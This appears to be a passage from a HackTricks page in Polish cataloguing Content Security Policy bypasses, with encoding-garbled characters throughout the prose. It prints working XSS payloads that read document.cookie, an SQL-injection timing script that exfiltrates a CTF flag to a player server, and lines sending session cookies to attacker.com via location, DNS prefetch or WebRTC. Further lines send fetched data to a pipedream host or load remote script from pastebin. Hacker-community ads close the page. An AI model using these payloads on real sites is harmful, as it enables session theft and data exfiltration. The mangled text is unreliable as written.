Konkretna polityka znana jako Content Security Policy (CSP) moÅ¼e ograniczaÄ‡ zdarzenia JavaScript. Niemniej jednak, AngularJS wprowadza niestandardowe zdarzenia jako alternatywÄ™. W ramach zdarzenia AngularJS dostarcza unikalny obiekt `$event`, odnoszÄ…cy siÄ™ do natywnego obiektu zdarzenia przeglÄ…darki. Ten obiekt `$event` moÅ¼e byÄ‡ wykorzystany do obejÅ›cia CSP. Warto zauwaÅ¼yÄ‡, Å¼e w Chrome obiekt `$event/event` posiada atrybut `path`, przechowujÄ…cy tablicÄ™ obiektÃ³w zaangaÅ¼owanych w Å‚aÅ„cuch wykonania zdarzenia, z obiektem `window` zawsze umieszczonym na koÅ„cu. Ta struktura jest kluczowa dla taktyk ucieczki z piaskownicy.

Poprzez kierowanie tej tablicy do filtra `orderBy`, moÅ¼liwe jest iterowanie po niej, wykorzystujÄ…c terminalny element (obiekt `window`) do wywoÅ‚ania globalnej funkcji takiej jak `alert()`. Przedstawiony poniÅ¼ej fragment kodu ilustruje ten proces:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
To fragment pokazuje uÅ¼ycie dyrektywy `ng-focus` do wywoÅ‚ania zdarzenia, korzystajÄ…c z `$event.path|orderBy` do manipulowania tablicÄ… `path`, oraz wykorzystujÄ…c obiekt `window` do wykonania funkcji `alert()`, ujawniajÄ…c w ten sposÃ³b `document.cookie`.

**ZnajdÅº inne obejÅ›cia Angulara na** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS i domena z biaÅ‚ej listy
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
### Bypassowanie zasad CSP w Angular JS poprzez wywoÅ‚anie funkcji zwrotnych i pewne podatne klasy

Polityka CSP, ktÃ³ra umoÅ¼liwia Å‚adowanie skryptÃ³w z biaÅ‚ej listy domen w aplikacji Angular JS, moÅ¼e zostaÄ‡ obejÅ›niÄ™ta poprzez wywoÅ‚anie funkcji zwrotnych i pewnych podatnych klas. WiÄ™cej informacji na temat tej techniki moÅ¼na znaleÅºÄ‡ w szczegÃ³Å‚owym przewodniku dostÄ™pnym w tym [repozytorium git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

DziaÅ‚ajÄ…ce Å‚adunki:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Inne punkty koÅ„cowe do dowolnego wykonania JSONP moÅ¼na znaleÅºÄ‡ [**tutaj**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (niektÃ³re z nich zostaÅ‚y usuniÄ™te lub naprawione)

### Bypass za pomocÄ… przekierowania

Co siÄ™ dzieje, gdy CSP napotyka przekierowanie po stronie serwera? JeÅ›li przekierowanie prowadzi do innej domeny, ktÃ³ra nie jest dozwolona, to i tak zakoÅ„czy siÄ™ niepowodzeniem.

JednakÅ¼e, zgodnie z opisem w [specyfikacji CSP 4.2.2.3. ÅšcieÅ¼ki i przekierowania](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), jeÅ›li przekierowanie prowadzi do innej Å›cieÅ¼ki, moÅ¼e ominÄ…Ä‡ oryginalne ograniczenia.

Oto przykÅ‚ad:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
JeÅ›li CSP jest ustawione na `https://www.google.com/a/b/c/d`, poniewaÅ¼ uwzglÄ™dniany jest Å›cieÅ¼ka, zarÃ³wno skrypty `/test`, jak i `/a/test` zostanÄ… zablokowane przez CSP.

JednakÅ¼e, ostateczny `http://localhost:5555/301` zostanie **przekierowany po stronie serwera do `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. PoniewaÅ¼ jest to przekierowanie, **Å›cieÅ¼ka nie jest brana pod uwagÄ™**, a **skrypt moÅ¼e byÄ‡ zaÅ‚adowany**, co umoÅ¼liwia obejÅ›cie ograniczeÅ„ Å›cieÅ¼ki.

DziÄ™ki temu przekierowaniu, nawet jeÅ›li Å›cieÅ¼ka jest wskazana w caÅ‚oÅ›ci, nadal zostanie obejÅ›cia.

Dlatego najlepszym rozwiÄ…zaniem jest zapewnienie, Å¼e witryna nie posiada podatnoÅ›ci na otwarte przekierowania oraz Å¼e nie ma domen, ktÃ³re mogÄ… byÄ‡ wykorzystane w zasadach CSP.

### OminiÄ™cie CSP za pomocÄ… zwisajÄ…cego znacznika

Przeczytaj [tutaj](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; za pomocÄ… XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` oznacza, Å¼e moÅ¼na wykonaÄ‡ dowolny skrypt wewnÄ…trz kodu (XSS moÅ¼e wykonaÄ‡ kod), a `img-src *` oznacza, Å¼e moÅ¼na uÅ¼ywaÄ‡ na stronie internetowej dowolnego obrazu z dowolnego ÅºrÃ³dÅ‚a.

MoÅ¼na ominÄ…Ä‡ tÄ™ CSP, eksfiltrujÄ…c dane za pomocÄ… obrazÃ³w (w tym przypadku XSS wykorzystuje CSRF, gdzie strona dostÄ™pna przez bota zawiera SQLi i wydobywa flagÄ™ za pomocÄ… obrazu):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Z tego: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

MoÅ¼esz rÃ³wnieÅ¼ naduÅ¼yÄ‡ tej konfiguracji, aby **zaÅ‚adowaÄ‡ kod JavaScript wstawiony wewnÄ…trz obrazu**. Na przykÅ‚ad, jeÅ›li strona pozwala na Å‚adowanie obrazÃ³w z Twittera. MoÅ¼esz **stworzyÄ‡** **specjalny obraz**, **przesÅ‚aÄ‡** go na Twittera i naduÅ¼yÄ‡ "**unsafe-inline**" do **wykonania** kodu JS (jak w zwykÅ‚ym XSS), ktÃ³ry **zaÅ‚aduje** obraz, **wydobÄ™dzie** z niego **JS** i **wykona** **go**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Z UÅ¼yciem PracownikÃ³w UsÅ‚ugi

Funkcja **`importScripts`** pracownikÃ³w usÅ‚ugi nie jest ograniczona przez CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Wstrzykiwanie Polityki

**Badania:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

JeÅ›li **parametr** wysÅ‚any przez ciebie jest **wklejany do** **deklaracji** **polityki**, to moÅ¼esz **zmieniÄ‡** **politykÄ™** w taki sposÃ³b, Å¼e stanie siÄ™ **bezuÅ¼yteczna**. MoÅ¼esz **zezwoliÄ‡ na skrypt 'unsafe-inline'** za pomocÄ… ktÃ³regokolwiek z tych obejÅ›Ä‡:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
PoniewaÅ¼ ta dyrektywa **nadpisze istniejÄ…ce dyrektywy script-src**.\
MoÅ¼esz znaleÅºÄ‡ przykÅ‚ad tutaj: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

W Edge jest znacznie prostsze. JeÅ›li moÅ¼esz dodaÄ‡ do CSP tylko to: **`;_`** **Edge** **porzuci** caÅ‚Ä… **politykÄ™**.\
PrzykÅ‚ad: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; za pomocÄ… XSS (iframe) - Atak czasowy

ZauwaÅ¼ brak dyrektywy `'unsafe-inline'`\
Tym razem moÅ¼esz sprawiÄ‡, Å¼e ofiara **zaÅ‚aduje** stronÄ™ pod **TwojÄ… kontrolÄ…** za pomocÄ… **XSS** z `<iframe`. Tym razem sprawisz, Å¼e ofiara uzyska dostÄ™p do strony, z ktÃ³rej chcesz wyciÄ…gnÄ…Ä‡ informacje (**CSRF**). Nie moÅ¼esz uzyskaÄ‡ dostÄ™pu do zawartoÅ›ci strony, ale jeÅ›li w jakiÅ› sposÃ³b moÅ¼esz **kontrolowaÄ‡ czas potrzebny na zaÅ‚adowanie strony**, moÅ¼esz wyciÄ…gnÄ…Ä‡ potrzebne informacje.

Tym razem **flaga** zostanie wyciÄ…gniÄ™ta, za kaÅ¼dym razem gdy **poprawnie zgadniesz znak** za pomocÄ… SQLi, **odpowiedÅº** zajmie **wiÄ™cej czasu** z powodu funkcji sleep. Wtedy bÄ™dziesz mÃ³gÅ‚ wyciÄ…gnÄ…Ä‡ flagÄ™:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Za pomocÄ… zakÅ‚adek

Ten atak zakÅ‚ada pewne inÅ¼ynierii spoÅ‚ecznej, gdzie atakujÄ…cy **przekonuje uÅ¼ytkownika, aby przeciÄ…gnÄ…Å‚ i upuÅ›ciÅ‚ link na zakÅ‚adkÄ™ przeglÄ…darki**. Ta zakÅ‚adka zawieraÅ‚aby **zÅ‚oÅ›liwy kod JavaScript**, ktÃ³ry po przeciÄ…gniÄ™ciu lub klikniÄ™ciu byÅ‚by wykonany w kontekÅ›cie bieÅ¼Ä…cego okna przeglÄ…darki, **omijajÄ…c CSP i umoÅ¼liwiajÄ…c kradzieÅ¼ wraÅ¼liwych informacji** takich jak ciasteczka lub tokeny.

Aby uzyskaÄ‡ wiÄ™cej informacji, [**sprawdÅº oryginalny raport tutaj**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### OminiÄ™cie CSP poprzez ograniczenie CSP

W [**tym opisie rozwiÄ…zania CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP jest omijany poprzez wstrzykniÄ™cie bardziej restrykcyjnego CSP do dozwolonego elementu iframe, ktÃ³ry uniemoÅ¼liwia zaÅ‚adowanie okreÅ›lonego pliku JS, ktÃ³ry nastÄ™pnie za pomocÄ… **zanieczyszczania prototypu** lub **nadpisywania DOM** pozwala na **wykorzystanie innego skryptu do zaÅ‚adowania dowolnego skryptu**.

MoÅ¼esz **ograniczyÄ‡ CSP elementu iframe** za pomocÄ… atrybutu **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

W [**tym opisie CTF**](https://github.com/aszx87410/ctf-writeups/issues/48) byÅ‚o moÅ¼liwe poprzez **wstrzykniÄ™cie HTML** **ograniczenie** bardziej **CSP**, wiÄ™c skrypt uniemoÅ¼liwiajÄ…cy CSTI zostaÅ‚ wyÅ‚Ä…czony, a tym samym **podatnoÅ›Ä‡ staÅ‚a siÄ™ wykonalna.**\
CSP moÅ¼na zrobiÄ‡ bardziej restrykcyjne, uÅ¼ywajÄ…c **metatagÃ³w HTML** i skrypty inline mogÄ… byÄ‡ wyÅ‚Ä…czone **usuwajÄ…c** **wpis** pozwalajÄ…cy na ich **nonce** i **wÅ‚Ä…czanie konkretnego skryptu inline za pomocÄ… sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Wydostawanie siÄ™ JS za pomocÄ… Content-Security-Policy-Report-Only

JeÅ›li uda ci siÄ™ sprawiÄ‡, aby serwer odpowiedziaÅ‚ nagÅ‚Ã³wkiem **`Content-Security-Policy-Report-Only`** z **wartoÅ›ciÄ… kontrolowanÄ… przez ciebie** (moÅ¼e to byÄ‡ spowodowane CRLF), moÅ¼esz sprawiÄ‡, Å¼e bÄ™dzie on wskazywaÅ‚ na twÃ³j serwer, a jeÅ›li **opakujesz** zawartoÅ›Ä‡ **JS**, ktÃ³rÄ… chcesz wydobyÄ‡, za pomocÄ… **`<script>`** i poniewaÅ¼ bardzo prawdopodobne jest, Å¼e `unsafe-inline` nie jest dozwolone przez CSP, spowoduje to **bÅ‚Ä…d CSP** i czÄ™Å›Ä‡ skryptu (zawierajÄ…ca wraÅ¼liwe informacje) zostanie wysÅ‚ana na serwer z `Content-Security-Policy-Report-Only`.

PrzykÅ‚ad znajdziesz w [**tym opisie rozwiÄ…zania CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Ujawnianie informacji za pomocÄ… CSP i Iframe

* Tworzony jest element `iframe`, ktÃ³ry wskazuje na adres URL (nazwijmy go `https://example.redirect.com`), ktÃ³ry jest zezwolony przez CSP.
* NastÄ™pnie ten adres URL przekierowuje do tajnego adresu URL (np. `https://usersecret.example2.com`), ktÃ³ry **nie jest dozwolony** przez CSP.
* SÅ‚uchajÄ…c zdarzenia `securitypolicyviolation`, moÅ¼na przechwyciÄ‡ wÅ‚aÅ›ciwoÅ›Ä‡ `blockedURI`. Ta wÅ‚aÅ›ciwoÅ›Ä‡ ujawnia domenÄ™ zablokowanego adresu URL, ujawniajÄ…c tajnÄ… domenÄ™, do ktÃ³rej przekierowaÅ‚ poczÄ…tkowy adres URL.

Warto zauwaÅ¼yÄ‡, Å¼e przeglÄ…darki takie jak Chrome i Firefox majÄ… rÃ³Å¼ne zachowania w obsÅ‚udze ramek iframe w kontekÅ›cie CSP, co prowadzi do potencjalnego wycieku wraÅ¼liwych informacji z powodu niezdefiniowanego zachowania.

InnÄ… technikÄ… jest wykorzystanie samego CSP do wydedukowania tajnej subdomeny. Ta metoda polega na algorytmie wyszukiwania binarnego i dostosowaniu CSP, aby zawieraÅ‚ okreÅ›lone domeny, ktÃ³re sÄ… celowo blokowane. Na przykÅ‚ad, jeÅ›li tajna subdomena skÅ‚ada siÄ™ z nieznanych znakÃ³w, moÅ¼na iteracyjnie testowaÄ‡ rÃ³Å¼ne subdomeny, modyfikujÄ…c dyrektywÄ™ CSP, aby blokowaÄ‡ lub zezwalaÄ‡ na te subdomeny. Oto fragment pokazujÄ…cy, jak moÅ¼na skonfigurowaÄ‡ CSP, aby uÅ‚atwiÄ‡ tÄ™ metodÄ™:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Poprzez monitorowanie, ktÃ³re Å¼Ä…dania sÄ… blokowane lub zezwala na nie przez CSP, moÅ¼na zawÄ™ziÄ‡ moÅ¼liwe znaki w sekretnym subdomenie, ostatecznie odkrywajÄ…c peÅ‚ny adres URL.

Obie metody wykorzystujÄ… niuanse implementacji i zachowania CSP w przeglÄ…darkach, pokazujÄ…c, jak pozornie bezpieczne zasady mogÄ… nieumyÅ›lnie ujawniÄ‡ wraÅ¼liwe informacje.

Sztuczka z [**tutaj**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**SpostrzeÅ¼enia Hakerskie**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerskie

**AktualnoÅ›ci Hakerskie na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerskiego dziÄ™ki aktualnoÅ›ciom i spostrzeÅ¼eniom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami nagrÃ³d za bÅ‚Ä™dy i istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## Niebezpieczne Technologie do Ominania CSP

### BÅ‚Ä™dy PHP przy zbyt wielu parametrach

Zgodnie z [**ostatniÄ… technikÄ… skomentowanÄ… w tym filmie**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), wysyÅ‚anie zbyt wielu parametrÃ³w (1001 parametrÃ³w GET, chociaÅ¼ moÅ¼na to rÃ³wnieÅ¼ zrobiÄ‡ z parametrami POST i ponad 20 plikami). Jakiekolwiek zdefiniowane **`header()`** w kodzie PHP na stronie internetowej **nie zostanie wysÅ‚ane**, ze wzglÄ™du na bÅ‚Ä…d, jaki to spowoduje.

### PrzeÅ‚adowanie bufora odpowiedzi PHP

PHP jest znany z **buforowania odpowiedzi do 4096** bajtÃ³w domyÅ›lnie. Dlatego jeÅ›li PHP wyÅ›wietla ostrzeÅ¼enie, dostarczajÄ…c **wystarczajÄ…co danych w ostrzeÅ¼eniach**, **odpowiedÅº** zostanie **wysÅ‚ana** **przed** **nagÅ‚Ã³wkiem CSP**, powodujÄ…c zignorowanie nagÅ‚Ã³wka.\
NastÄ™pnie technika polega gÅ‚Ã³wnie na **wypeÅ‚nieniu bufora odpowiedzi ostrzeÅ¼eniami**, aby nagÅ‚Ã³wek CSP nie zostaÅ‚ wysÅ‚any.

PomysÅ‚ z [**tego writeupu**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Przepisanie Strony BÅ‚Ä™du

Z [**tego writeupu**](https://blog.ssrf.kr/69) wyglÄ…da na to, Å¼e byÅ‚o moÅ¼liwe ominiÄ™cie ochrony CSP poprzez zaÅ‚adowanie strony bÅ‚Ä™du (potencjalnie bez CSP) i przepisanie jej zawartoÅ›ci.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME to technika, ktÃ³ra naduÅ¼ywa XSS (lub bardzo ograniczonego XSS) **w punkcie koÅ„cowym strony** do **naduÅ¼ycia** **innych punktÃ³w koÅ„cowych tego samego pochodzenia.** Polega to na zaÅ‚adowaniu podatnego punktu koÅ„cowego z strony atakujÄ…cej, a nastÄ™pnie odÅ›wieÅ¼eniu strony atakujÄ…cej do rzeczywistego punktu koÅ„cowego w tym samym pochodzeniu, ktÃ³ry chcesz naduÅ¼yÄ‡. W ten sposÃ³b **podatny punkt koÅ„cowy** moÅ¼e uÅ¼yÄ‡ obiektu **`opener`** w **Å‚adunku** do **dostÄ™pu do DOM** **rzeczywistego punktu koÅ„cowego do naduÅ¼ycia**. Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Co wiÄ™cej, **wordpress** ma punkt koÅ„cowy **JSONP** w `/wp-json/wp/v2/users/1?_jsonp=data`, ktÃ³ry **odzwierciedla** **dane** wysÅ‚ane w wyjÅ›ciu (z ograniczeniem tylko liter, cyfr i kropek).

AtakujÄ…cy moÅ¼e naduÅ¼yÄ‡ tego punktu koÅ„cowego, aby **wykonaÄ‡ atak SOME** na WordPress i **osadziÄ‡** go wewnÄ…trz `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` zauwaÅ¼, Å¼e ten **skrypt** zostanie **zaÅ‚adowany**, poniewaÅ¼ jest **dozwolony przez 'self'**. Co wiÄ™cej, poniewaÅ¼ WordPress jest zainstalowany, atakujÄ…cy moÅ¼e naduÅ¼yÄ‡ **ataku SOME** poprzez **podatny** **punkt koÅ„cowy wywoÅ‚ania zwrotnego**, ktÃ³ry **omija CSP**, aby nadaÄ‡ wiÄ™cej uprawnieÅ„ uÅ¼ytkownikowi, zainstalowaÄ‡ nowy dodatek...\
Aby uzyskaÄ‡ wiÄ™cej informacji na temat wykonania tego ataku, sprawdÅº [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypassy eksfiltracji CSP

JeÅ›li istnieje surowa CSP, ktÃ³ra nie pozwala ci **interagowaÄ‡ z zewnÄ™trznymi serwerami**, zawsze istniejÄ… pewne rzeczy, ktÃ³re moÅ¼esz zrobiÄ‡, aby eksfiltrowaÄ‡ informacje.

### Lokalizacja

MoÅ¼esz po prostu zaktualizowaÄ‡ lokalizacjÄ™, aby przesÅ‚aÄ‡ na serwer atakujÄ…cego poufne informacje:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

MoÅ¼esz przekierowaÄ‡, wstrzykujÄ…c meta tag (to tylko przekierowanie, nie ujawni to zawartoÅ›ci)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Aby szybciej Å‚adowaÄ‡ strony, przeglÄ…darki bÄ™dÄ… wstÄ™pnie rozwiÄ…zywaÄ‡ nazwy hostÃ³w na adresy IP i buforowaÄ‡ je do pÃ³Åºniejszego uÅ¼ycia.\
MoÅ¼esz wskazaÄ‡ przeglÄ…darce, aby wstÄ™pnie rozwiÄ…zaÅ‚a nazwÄ™ hosta za pomocÄ…: `<link rel="dns-prefetch" href="something.com">`

MoÅ¼esz wykorzystaÄ‡ to zachowanie do **wycieku wraÅ¼liwych informacji za pomocÄ… Å¼Ä…daÅ„ DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Inny sposÃ³b:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Aby temu zapobiec, serwer moÅ¼e wysÅ‚aÄ‡ nagÅ‚Ã³wek HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Widocznie ta technika nie dziaÅ‚a w przeglÄ…darkach bez interfejsu (botach)
{% endhint %}

### WebRTC

Na kilku stronach moÅ¼esz przeczytaÄ‡, Å¼e **WebRTC nie sprawdza polityki `connect-src`** CSP.

W rzeczywistoÅ›ci moÅ¼esz _wyciekaÄ‡_ informacje za pomocÄ… _Å¼Ä…dania DNS_. SprawdÅº ten kod:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Inna opcja:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Sprawdzanie zasad CSP online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatyczne tworzenie CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referencje

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

â€‹

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**Spojrzenie na Hacking**\
Zanurz siÄ™ w treÅ›ci, ktÃ³re zgÅ‚Ä™biajÄ… emocje i wyzwania hackowania

**AktualnoÅ›ci z Hackingu na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim Å›wiatem hackowania dziÄ™ki aktualnoÅ›ciom i spojrzeniom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
